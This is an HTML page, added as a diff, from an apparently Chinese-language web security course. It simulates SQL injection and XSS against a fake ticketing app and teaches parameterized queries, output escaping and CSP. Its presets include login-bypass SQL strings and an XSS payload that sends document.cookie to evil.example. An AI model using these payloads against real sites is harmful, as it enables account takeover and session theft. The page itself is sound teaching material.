@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="zh-Hans-CN" data-lang="zh-cn" data-slug="sql-injection-xss">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="description" content="用 SQL 注入和 XSS 攻击一个沙盒里的假售票 App，再套用修法，重新攻击一次。">
+<title>SQL 注入与 XSS · System Design Lab</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@500;600&family=IBM+Plex+Sans:wght@400;500;600&family=Silkscreen:wght@400;700&family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../assets/explainer.css">
+</head>
+<body>
+<header class="topbar"><div class="topbar-inner">
+  <a class="brand" href="../">system<b>.design.lab</b></a>
+  <nav class="acts" aria-label="章节"><a href="#sqli">SQL 注入</a><a href="#xss">XSS</a><a href="#real">代码</a><a href="#recap">重点整理</a></nav>
+</div></header>
+
+<main id="top">
+<section class="panel hero">
+  <div class="panel-label"><span>第 4 页 · 阶段 1 · 一台服务器</span><span class="hot">78 · 79</span></div>
+  <div class="eyebrow">SQL 注入、跨站脚本（XSS）</div>
+  <h1>攻击只是一段文字。<em>真正的漏洞是把它当成代码。</em></h1>
+  <div class="scenario"><b>Encore</b>Encore 有一个登录表单，每场演唱会下面还有评论框。两者都会把用户输入的内容放到某个地方：放进数据库查找，以及放进网页。下面是两者各自的沙盒副本。这里不会碰到真的数据库，也不会运行真的脚本。</div>
+  <div class="row"><a class="btn primary" href="#sqli" style="text-decoration:none">开始攻击 ↓</a></div>
+</section>
+
+<section class="panel" id="sqli">
+  <div class="panel-label"><span>沙盒 1 · SQL 注入</span><span class="hot" id="sqlTag">字符串拼接</span></div>
+  <h2>不知道密码，也能用管理员身分登录</h2>
+  <div class="lab">
+    <div class="controls">
+      <div class="ctl"><label for="em">Email</label><input class="input" id="em" value="ana@encore.example" autocomplete="off" spellcheck="false"></div>
+      <div class="ctl"><label for="pw">密码</label><input class="input" id="pw" value="tickets123" autocomplete="off" spellcheck="false"></div>
+    </div>
+    <div class="row" style="margin:0">
+      <div class="presets" id="sqlPresets"></div>
+    </div>
+    <div class="controls">
+      <div class="ctl"><span class="lab-k">服务器怎么组出查找</span><div id="sqlSeg"></div></div>
+      <div class="ctl"><span class="lab-k">&nbsp;</span><div><button class="btn primary" id="loginBtn" type="button">登录</button></div></div>
+    </div>
+    <div>
+      <div class="lab-k" style="font-size:14px;font-weight:500;margin-bottom:6px">数据库实际收到的内容</div>
+      <pre class="sqlbox" id="sqlOut" aria-live="polite"></pre>
+      <p class="muted" style="font-size:13px;margin:6px 0 0"><span class="sqlbox" style="display:inline;padding:0 4px"><span class="u">橘色</span></span> ＝你输入的内容，被当成 SQL 读取。 <span class="sqlbox" style="display:inline;padding:0 4px"><span class="u data">绿色</span></span> ＝你输入的内容，被保留为数据。删除线＝被数据库忽略。</p>
+    </div>
+    <div class="status" id="sqlRes" role="status">从上面选一种攻击，或自己输入，然后按「登录」。</div>
+  </div>
+</section>
+
+<section class="panel" id="xss">
+  <div class="panel-label"><span>沙盒 2 · 跨站脚本</span><span class="hot" id="xssTag">innerHTML</span></div>
+  <h2>发一则会攻击每位读者的评论</h2>
+  <div class="lab">
+    <div class="ctl"><label for="rv">你对「重聚巡演 · 第 1 晚」的评论</label><input class="input" id="rv" value="Best night of my life!!" autocomplete="off" spellcheck="false"></div>
+    <div class="presets" id="xssPresets"></div>
+    <div class="controls">
+      <div class="ctl"><span class="lab-k">页面怎么显示评论</span><div id="xssSeg"></div></div>
+      <div class="ctl"><span class="lab-k">&nbsp;</span><div><button class="btn primary" id="postBtn" type="button">送出评论</button></div></div>
+    </div>
+    <div class="browser" aria-label="模拟浏览器，显示演唱会页面">
+      <div class="bar2">encore.example/concerts/reunion-night-1 · 其他歌迷看到的画面（模拟）</div>
+      <div class="body2" id="reviews"></div>
+    </div>
+    <div class="status" id="xssRes" role="status">评论会在模拟浏览器中呈现。输入框里的 HTML 从来不会真的插入这个页面。</div>
+  </div>
+
+  <h3>试试看</h3>
+  <ol class="missions" id="missions"></ol>
+
+  <div class="takeaway"><div class="t">关键差别</div><p>两种攻击的原理相同：<b>用户的文字被混进代码</b>（SQL 或 HTML），电脑分不出你的文字在哪里结束、代码从哪里开始。修法的原理也相同：让数据和代码分开。SQL 用<b>参数</b>，HTML 用<b>输出跳脱（escape）</b>。</p></div>
+</section>
+
+<section class="panel" id="real">
+  <div class="panel-label"><span>第 3 幕 · 真实世界</span><span class="hot">代码</span></div>
+  <h2>漏洞与修法并排比较</h2>
+  <p>每个修法都只要改一行。<b>把鼠标移到某一行上，或点一下。</b></p>
+  <div class="yaml-wrap">
+    <pre class="yaml" id="code" aria-label="有漏洞与修好后的代码"></pre>
+    <div class="explain" aria-live="polite"><div class="t" id="exT">👆 选一行</div><p id="exP">每一行反白后，都会对应到沙盒的一种模式。</p></div>
+  </div>
+</section>
+
+<section class="panel" id="recap">
+  <div class="panel-label"><span>重点整理 · 带走这些</span><span class="hot">♥</span></div>
+  <h2>整页浓缩在一个画面</h2>
+  <div class="cards">
+    <div class="card"><div class="sub">攻击数据库</div><div class="t">SQL 注入</div><p>被拼进查找字符串的输入会改变查找本身：跳过密码检查、读取别人的数据、删除数据表。修法：参数化查找。</p></div>
+    <div class="card"><div class="sub">攻击你的用户</div><div class="t">XSS</div><p>以 HTML 插入页面的输入会变成脚本，在每位访客的浏览器里以他们的身分运行。修法：插入文字而不是 HTML（输出跳脱），再加上 CSP。</p></div>
+    <div class="card"><div class="sub">原则</div><div class="t">数据 ≠ 代码</div><p>永远不要把用户的文字拼进代码。交给数据库驱动程序或浏览器把两者分开。</p></div>
+  </div>
+  <div class="takeaway"><div class="t">取舍</div><p>这些修法几乎没有成本，现代框架也默认就会做。风险藏在那些逃生口：原生 SQL 辅助函数、<code>innerHTML</code>、<code>dangerouslySetInnerHTML</code>、<code>|safe</code>。每一个都要审查。</p></div>
+
+  <h3 style="margin-top:26px">考考自己 <span class="score" id="score"></span></h3>
+  <ol class="mcq" id="quiz"></ol>
+</section>
+
+<nav class="pager" id="pager" aria-label="页面"></nav>
+</main>
+
+<script src="../../assets/explainer.js"></script>
+<script src="../../assets/i18n.zh-cn.js"></script>
+<script>
+(() => {
+const { $, el, esc } = X;
+const USERS = [
+  { email: 'admin@encore.example', pw: 'Xk9#long-secret', name: 'Admin', role: '管理员：可以看到每一笔订单，并退任何一张票' },
+  { email: 'ana@encore.example', pw: 'tickets123', name: 'Ana', role: 'fan' },
+  { email: 'ben@encore.example', pw: 'hunter2', name: 'Ben', role: 'fan' },
+];
+const state = { sqlSafe: false, htmlSafe: false, adminBreach: false, blockedAfterFix: false, xssRan: false, xssBlocked: false, normalLogin: false };
+
+/* ---------- SQL sandbox (pure evaluation) ---------- */
+function evaluateLogin(email, pw, safe) {
+  const exact = () => {
+    const u = USERS.find(x => x.email === email && x.pw === pw);
+    return u ? { kind: 'ok', user: u, rows: 1 } : { kind: 'none', rows: 0 };
+  };
+  if (safe || (!email.includes("'") && !pw.includes("'"))) return exact();
+  const all = email + ' ' + pw;
+  if (/;\s*drop\s+table/i.test(all)) return { kind: 'drop' };
+  if (/'\s*or\s*'?1'?\s*=\s*'?1/i.test(all)) return { kind: 'ok', user: USERS[0], rows: USERS.length, injected: true };
+  const m = email.match(/^([^']*)'\s*--/);
+  if (m) {
+    const u = USERS.find(x => x.email === m[1]);
+    return u ? { kind: 'ok', user: u, rows: 1, injected: true } : { kind: 'none', rows: 0, injected: true };
+  }
+  return { kind: 'syntax', near: email.includes("'") ? email.slice(email.indexOf("'") + 1, email.indexOf("'") + 12) : pw.slice(pw.indexOf("'") + 1, pw.indexOf("'") + 12) };
+}
+function renderQuery(email, pw, safe) {
+  if (safe) {
+    return `<span class="k">SELECT</span> * <span class="k">FROM</span> users <span class="k">WHERE</span> email = $1 <span class="k">AND</span> password = $2\n\nparams: [ "<span class="u data">${esc(email)}</span>", "<span class="u data">${esc(pw)}</span>" ]`;
+  }
+  const parts = [["SELECT * FROM users WHERE email = '", 0], [email, 1], ["' AND password = '", 0], [pw, 1], ["'", 0]];
+  const chars = parts.flatMap(([t, u]) => [...t].map(ch => ({ ch, u })));
+  const str = chars.map(c => c.ch).join('');
+  let dead = -1;
+  for (let i = str.indexOf('--'); i !== -1; i = str.indexOf('--', i + 1)) if (chars[i].u) { dead = i; break; }
+  let html = '', cur = null;
+  const flush = (cls, buf) => { if (buf) html += cls ? `<span class="${cls}">${esc(buf)}</span>` : esc(buf); };
+  let buf = '';
+  chars.forEach((c, i) => {
+    const cls = [c.u ? 'u' : '', dead >= 0 && i >= dead ? 'dead' : ''].filter(Boolean).join(' ');
+    if (cls !== cur) { flush(cur, buf); buf = ''; cur = cls; }
+    buf += c.ch;
+  });
+  flush(cur, buf);
+  return html;
+}
+let sqlSafe = false;
+const sqlPresetList = [
+  ['正常登录', 'ana@encore.example', 'tickets123'],
+  ['跳过密码', "admin@encore.example' --", 'anything'],
+  ['永远为真', "' OR '1'='1' --", 'x'],
+  ['名字里有单引号的真人', "o'brien@encore.example", 'pass'],
+];
+sqlPresetList.forEach(([label, e, p]) => {
+  const b = el('button', 'btn sm', label); b.type = 'button';
+  b.onclick = () => { $('#em').value = e; $('#pw').value = p; showQuery(); };
+  $('#sqlPresets').append(b);
+});
+const showQuery = () => { $('#sqlOut').innerHTML = renderQuery($('#em').value, $('#pw').value, sqlSafe); };
+['em', 'pw'].forEach(id => $('#' + id).addEventListener('input', showQuery));
+X.seg($('#sqlSeg'), ['把字符串拼起来', '参数（$1, $2）'], i => { sqlSafe = i === 1; $('#sqlTag').textContent = sqlSafe ? 'parameterized' : '字符串拼接'; showQuery(); }, 0);
+$('#loginBtn').addEventListener('click', () => {
+  const email = $('#em').value, pw = $('#pw').value;
+  const r = evaluateLogin(email, pw, sqlSafe);
+  const st = $('#sqlRes');
+  const attacky = /'/.test(email + pw);
+  if (r.kind === 'ok' && r.injected) {
+    st.className = 'status bad';
+    st.innerHTML = `✕ <b>以 ${r.user.name} 身分登录</b>（${r.user.role}），完全不需要密码。你的文字提早结束了引号${/--/.test(email) ? '，而 <code>--</code> 把密码检查变成了注解' : ''}${r.rows > 1 ? `。这条查找符合全部 ${r.rows} 位用户，App 直接选了第一位` : ''}。`;
+    if (r.user.name === 'Admin') state.adminBreach = true;
+  } else if (r.kind === 'ok') {
+    st.className = 'status ok'; st.innerHTML = `✓ 以 ${r.user.name} 身分登录。正常登录，没有异状。`; state.normalLogin = true;
+  } else if (r.kind === 'drop') {
+    st.className = 'status bad'; st.innerHTML = '✕ 数据库运行了第二道指令，<b>删掉了 users 数据表</b>（模拟）。所有人都被锁在外面。';
+  } else if (r.kind === 'syntax') {
+    st.className = 'status bad'; st.innerHTML = `✕ <code>ERROR: syntax error at or near "${esc(r.near)}"</code>。输入中的单引号弄坏了查找。这个错误消息也等于告诉攻击者：输入毫无保护地进到了 SQL。`;
+  } else {
+    st.className = 'status ok';
+    st.innerHTML = sqlSafe && attacky
+      ? '✓ <b>登录失败。</b>数据库去找 email 字面上就是 <code>' + esc(email) + '</code> 的用户，结果没有。你的引号和破折号都还是数据。'
+      : '✓ Email 或密码错误。';
+    if (sqlSafe && attacky && state.adminBreach) state.blockedAfterFix = true;
+  }
+  showQuery(); mis.update(state);
+});
+showQuery();
+
+/* ---------- XSS sandbox ---------- */
+let htmlSafe = false;
+const reviews = [{ by: 'Cai', text: '从二楼包厢听，音响效果超赞。' }, { by: 'Dee', text: '周边排队排很久，但值得。' }];
+const xssPresetList = [
+  ['一般评论', '人生最棒的一晚！！'],
+  ['粗体字', '这场<b>太神了</b>'],
+  ['偷 cookie', `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`],
+  ['Script 标签', '<script>location="https://evil.example/fake-login"<\/script>'],
+];
+xssPresetList.forEach(([label, t]) => {
+  const b = el('button', 'btn sm', label); b.type = 'button';
+  b.onclick = () => { $('#rv').value = t; };
+  $('#xssPresets').append(b);
+});
+const isEvil = t => /<script|on\w+\s*=|javascript:/i.test(t);
+const stripTags = t => t.replace(/<[^>]*>/g, '');
+let victims = 0, vTimer = null;
+function drawReviews() {
+  const box = $('#reviews'); box.innerHTML = '';
+  let evilShown = false;
+  reviews.forEach(r => {
+    const d = el('div', 'review');
+    d.append(el('div', 'by', esc(r.by)));
+    const body = el('div');
+    if (htmlSafe) {
+      body.textContent = r.text; // always text: this is the fix
+      if (/[<>]/.test(r.text)) d.append(body, el('div', 'muted', `<small>送到浏览器的 HTML：<code>${esc(esc(r.text))}</code></small>`));
+      else d.append(body);
+    } else {
+      // Simulation of innerHTML: we never insert the HTML for real.
+      const shown = stripTags(r.text);
+      if (/<b>/i.test(r.text)) { const b = el('b'); b.textContent = shown; body.append(b); } else body.textContent = shown || ' ';
+      d.append(body);
+      if (isEvil(r.text)) {
+        evilShown = true;
+        d.append(el('div', 'status bad', `⚠ <b>脚本在这位访客的浏览器里运行了</b>：${/fake-login/.test(r.text) ? '把他们导向假的登录页' : '把他们的会话 cookie 传到 evil.example'}。（模拟。）每位打开这个页面的歌迷都会再运行一次。`));
+      }
+    }
+    box.append(d);
+  });
+  clearInterval(vTimer);
+  if (evilShown) { vTimer = setInterval(() => { victims += 2; $('#xssRes').innerHTML = `✕ 攻击之后打开这个页面的歌迷：<b>${victims}</b> 位。每一位都运行了攻击者的代码。`; }, 800); }
+  return evilShown;
+}
+X.seg($('#xssSeg'), ['以 HTML 插入（innerHTML）', '以文字插入（已跳脱）'], i => {
+  htmlSafe = i === 1; $('#xssTag').textContent = htmlSafe ? 'textContent' : 'innerHTML';
+  const evil = drawReviews();
+  if (htmlSafe) {
+    $('#xssRes').className = 'status ok';
+    $('#xssRes').textContent = reviews.some(r => isEvil(r.text)) ? '✓ 同样的评论，现在以文字插入。攻击内容只会显示成无害的字符，什么都不会运行。' : '✓ 评论以文字插入。';
+    if (reviews.some(r => isEvil(r.text)) && state.xssRan) { state.xssBlocked = true; mis.update(state); }
+  } else if (!evil) { $('#xssRes').className = 'status'; $('#xssRes').textContent = '评论以 HTML 插入。'; }
+}, 0);
+$('#postBtn').addEventListener('click', () => {
+  const t = $('#rv').value.trim(); if (!t) return;
+  reviews.push({ by: '你', text: t });
+  const evil = drawReviews();
+  const st = $('#xssRes');
+  if (evil && !htmlSafe) { st.className = 'status bad'; state.xssRan = true; victims = 0; }
+  else if (htmlSafe && isEvil(t)) { st.className = 'status ok'; st.textContent = '✓ 已送出。浏览器显示的是 < 和 > 这两个字符，而不是创建元素，所以什么都不会运行。'; if (state.xssRan) state.xssBlocked = true; }
+  else { st.className = 'status ok'; st.textContent = /<b>/i.test(t) && !htmlSafe ? '✓ 已送出。粗体有效，因为浏览器把你的文字当成 HTML 在读。嗯……' : '✓ 已送出。'; }
+  mis.update(state);
+});
+drawReviews();
+
+const mis = X.missions($('#missions'), [
+  { text: '在沙盒 1 中，以 Ana 的身分正常登录。', hint: '用「正常登录」。注意你的文字落在查找的哪里。', check: s => s.normalLogin },
+  { text: '不输入密码，以<b>管理员</b>身分登录。', hint: '试试「跳过密码」。看看 <code>--</code> 对查找的其余部分做了什么。', check: s => s.adminBreach },
+  { text: '切换到<b>参数</b>，再试一次同样的攻击。', hint: '现在查找和你的文字是分开发送的。', check: s => s.blockedAfterFix },
+  { text: '在沙盒 2 中，送出<b>偷 cookie</b> 这则评论。', hint: '看看其他歌迷会遇到什么。', check: s => s.xssRan },
+  { text: '切换到<b>以文字插入</b>。', hint: '同样的评论、同样的页面，只是它不再是代码。', check: s => s.xssBlocked },
+]);
+
+/* ---------- code map ---------- */
+X.codeMap($('#code'), [
+  ['<span class="c">// ✕ 用拼接字符串组出 SQL</span>', null],
+  ['db.query(<span class="s">"SELECT * FROM users WHERE email = \'"</span> + email +', 'concat'],
+  ['         <span class="s">"\' AND password = \'"</span> + pw + <span class="s">"\'"</span>);', 'concat'],
+  ['', null],
+  ['<span class="c">// ✓ 参数化：查找和数据分开发送</span>', null],
+  ['db.query(<span class="s">"SELECT * FROM users WHERE email = $1"</span>, [email]);', 'param'],
+  ['<span class="c">//   ……接着比对密码哈希，绝不比对明文</span>', 'hash'],
+  ['', null],
+  ['<span class="c">// ✕ 把评论当成 HTML 放进页面</span>', null],
+  ['reviewEl.<span class="key">innerHTML</span> = review.text;', 'inner'],
+  ['', null],
+  ['<span class="c">// ✓ 把它当成文字放进去</span>', null],
+  ['reviewEl.<span class="key">textContent</span> = review.text;', 'text'],
+  ['', null],
+  ['<span class="c"># ✓ 安全网：一个 HTTP 响应标头</span>', null],
+  ['<span class="key">Content-Security-Policy</span>: script-src <span class="s">\'self\'</span>', 'csp'],
+], {
+  concat: ['字符串拼接', '数据库收到一长串字符串，无从得知哪一部分来自用户。输入里的单引号会提早结束字符串，后面的内容全被当成 SQL 读取。'],
+  param: ['参数', '查找是带着占位符送出的，值则另外发送，而且<b>永远</b>被当成数据，所以里面的引号和破折号改变不了查找。每个数据库驱动程序和 ORM 都支持。'],
+  hash: ['密码', '为了简单，沙盒直接比对明文密码。真实的 App 会保存慢速哈希（bcrypt、argon2）并比对哈希值，这样数据表外泄也不会泄漏密码。'],
+  inner: ['innerHTML', '告诉浏览器「把这段当成 HTML 解析」。标签会变成元素，像 <code>onerror</code> 这样的事件处理器会变成会运行的代码。React 的 <code>dangerouslySetInnerHTML</code> 也一样。'],
+  text: ['textContent', '告诉浏览器「这是文字」。<code>&lt;</code> 会显示成一个字符。React、Vue、Svelte 等框架在你写 <code>{review.text}</code> 时默认就会这样做。'],
+  csp: ['内容安全政策（CSP）', '第二道防线：浏览器拒绝运行行内脚本和其他网站的脚本。它能拦下你漏掉的漏洞，但不能取代跳脱。'],
+}, $('#exT'), $('#exP'));
+
+/* ---------- quiz + pager ---------- */
+X.quiz($('#quiz'), [
+  { q: 'Ben 建议把每个输入里的单引号都删掉，借此挡下 SQL 注入。问题在哪里？', opts: [
+    ['没问题。没有单引号就不可能注入', false, '攻击者有很多不需要单引号的手法（数字字段、编码、其他语法）。而且 O\'Brien 从此无法注册。'],
+    ['它会弄坏正常输入，也能被绕过。参数化查找才是根本解法。', true, '过滤输入是在猜哪些字符危险。参数则让输入完全不可能变成 SQL。'],
+    ['有用，但会拖慢数据库', false, '问题不在速度。它是不完整的防御，还会挡掉合法数据。'],
+  ] },
+  { q: '攻击者发了一则会运行脚本的评论。谁的数据有危险？', opts: [
+    ['只有攻击者自己的，因为那是他的评论', false, '脚本是在浏览这个页面的人的浏览器中运行，不是在作者的。'],
+    ['每位打开这个页面的歌迷：脚本可以冒用他们的身分，读取他们看到的内容', true, '这就是保存型 XSS 严重的地方：一则贴文，大量受害者。'],
+    ['只有数据库的', false, 'XSS 是在浏览器里运行，不是在服务器上。它攻击的是你的用户。'],
+  ] },
+  { q: 'Cai 想让评论支持粗体和链接，打算改用 <code>dangerouslySetInnerHTML</code>。安全的做法是什么？', opts: [
+    ['直接用。React 反正会跳脱。', false, '这个名字本身就是警告：React 正是对这个属性跳过跳脱。'],
+    ['使用受限的格式（例如 Markdown），或搭配严格白名单的 HTML 清理器，再加上 CSP', true, '只允许你需要的少数标签，其他全部移除（脚本、事件处理器），并保留 CSP 作为后备。'],
+    ['检查文字是否包含「&lt;script&gt;」，有的话就拒绝', false, '脚本不需要 script 标签也能运行（像 <code>onerror</code> 那个例子）。黑名单永远会漏掉东西。'],
+  ] },
+], $('#score'));
+X.pager($('#pager'), 'sql-injection-xss');
+})();
+</script>
+</body>
+</html>
